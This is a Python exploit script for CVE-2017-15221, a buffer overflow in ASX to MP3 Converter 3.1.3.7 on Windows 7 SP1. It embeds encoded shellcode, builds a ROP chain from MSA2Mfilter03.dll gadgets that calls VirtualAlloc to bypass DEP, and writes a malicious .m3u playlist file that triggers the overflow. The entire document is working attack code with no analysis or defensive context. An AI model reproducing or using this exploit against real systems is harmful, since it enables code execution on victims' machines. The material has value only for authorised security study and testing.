# Title: ASX to MP3 Converter 3.1.3.7 - CVE-2017-15221
# Target binary: ASX to MP3 Converter.exe
# Target system: Windows 7 SP1
# Author: lem0nSec

##### DEP bypass #####
# MSA2Mfilter03.dll --> REBASE=FALSE, ASLR=FALSE

from struct import pack


shellcode =  b""
shellcode += b"\xda\xd6\xbf\x9b\x12\x19\x15\xd9\x74\x24\xf4\x58\x2b"
shellcode += b"\xc9\xb1\x31\x31\x78\x18\x83\xc0\x04\x03\x78\x8f\xf0"
shellcode += b"\xec\xe9\x47\x76\x0e\x12\x97\x17\x86\xf7\xa6\x17\xfc"
shellcode += b"\x7c\x98\xa7\x76\xd0\x14\x43\xda\xc1\xaf\x21\xf3\xe6"
shellcode += b"\x18\x8f\x25\xc8\x99\xbc\x16\x4b\x19\xbf\x4a\xab\x20"
shellcode += b"\x70\x9f\xaa\x65\x6d\x52\xfe\x3e\xf9\xc1\xef\x4b\xb7"
shellcode += b"\xd9\x84\x07\x59\x5a\x78\xdf\x58\x4b\x2f\x54\x03\x4b"
shellcode += b"\xd1\xb9\x3f\xc2\xc9\xde\x7a\x9c\x62\x14\xf0\x1f\xa3"
shellcode += b"\x65\xf9\x8c\x8a\x4a\x08\xcc\xcb\x6c\xf3\xbb\x25\x8f"
shellcode += b"\x8e\xbb\xf1\xf2\x54\x49\xe2\x54\x1e\xe9\xce\x65\xf3"
shellcode += b"\x6c\x84\x69\xb8\xfb\xc2\x6d\x3f\x2f\x79\x89\xb4\xce"
shellcode += b"\xae\x18\x8e\xf4\x6a\x41\x54\x94\x2b\x2f\x3b\xa9\x2c"
shellcode += b"\x90\xe4\x0f\x26\x3c\xf0\x3d\x65\x2a\x07\xb3\x13\x18"
shellcode += b"\x07\xcb\x1b\x0c\x60\xfa\x90\xc3\xf7\x03\x73\xa0\x08"
shellcode += b"\x4e\xde\x80\x80\x17\x8a\x91\xcc\xa7\x60\xd5\xe8\x2b"
shellcode += b"\x81\xa5\x0e\x33\xe0\xa0\x4b\xf3\x18\xd8\xc4\x96\x1e"
shellcode += b"\x4f\xe4\xb2\x7c\x0e\x76\x5e\xad\xb5\xfe\xc5\xb1"

# bad characters: \x00\x0a\x09

'''
Register setup for VirtualAlloc() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualAlloc()
 EDI = ROP NOP (RETN)
 
 --- + PUSHAD # RETN	---
 
 --- + & JMP ESP 			---
 
'''

def generate_rop():

    gadgets = [
			
        # set esi --> ptr &VirtualAlloc
        0x41414141,
        0x10031a52, # POP EAX # RETN [MSA2Mfilter03.dll] 
        0x1004f060, # ptr to &VirtualAlloc() [IAT MSA2Mfilter03.dll]
        0x10028089, # MOV EAX,DWORD PTR DS:[EAX] # RETN [MSA2Mfilter03.dll]
        0x10040754, # PUSH EAX # POP ESI # POP EBP # LEA EAX,DWORD PTR DS:[ECX+EAX+D] # POP EBX # RETN
        0x41414141,
        0x41414141,


        # set edx --> 0x1000
        0x10030496, # pop eax # retn
        0xFFFFF001,
        0x1004d1c4, # NEG EAX # POP EBX # RETN
        0x41414141,
        0x100170f3, # inc eax, retn
        0x10034735, # PUSH EAX # ADD AL,5D # MOV EAX,1 # POP EBX # RETN
        0x10029b8c, # xor edx,edx # retn
        0x1002A06E, # ADD EDX,EBX # pop ebx # retn 0x10
        0x41414141,
        0x10030497,
        0x10030497,
        0x10030497,
        0x10030497,
        0x10030497,
        0x10030497,

        
        # set ecx --> 0x40
        0x10039781,  # POP ECX # RETN [MSA2Mfilter03.dll] 
        0xffffffff,
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        0x10031ebe,  # INC ECX # AND EAX,8 # RETN [MSA2Mfilter03.dll] 
        

        # set ebx --> 0x171
        0x10030496, # pop eax # retn
        0xFFFFFE8F, # 0x171 to negate
        0x1004d1c4, # NEG EAX # POP EBX # RETN
        0x41414141,
        0x10034735, # PUSH EAX # ADD AL,5D # MOV EAX,1 # POP EBX # RETN


        # set edi --> retn
        0x100301c6, # pop edi # retn
        0x10030497, # retn

			
        # set ebp --> & jmp esp
        0x1001076d, # pop ebp, retn
        0x10012316, # ADD ESP,8 # retn --> jmp to esp + 8

			
        # set pushad + jmp esp
        0x10030496, # pop eax # retn
        0xA1E84F6A,
        0x1004e0f1, # ADD EAX,5E58016A # RETN --> eax becomes 0x004050d4 (pushad # retn)
        0x10040ce5, # push eax # retn
        0x90909090,
        0x1003df73, # push esp # retn


        ]

    chain = []
    for i in gadgets:
        chain.append(pack("<I", i))
    return "".join(chain)

def exploit():

    rop_chain = generate_rop()

    payload = "http://"
    payload += "A"*17417
    payload += pack("<I", 0x10030497) # retn
    payload += rop_chain
    payload += "\x90"*32
    payload += shellcode


    f = open("sendme.m3u", "w")
    f.write(payload)
    f.close()

def main():
    exploit()

if __name__ == "__main__":
    main()
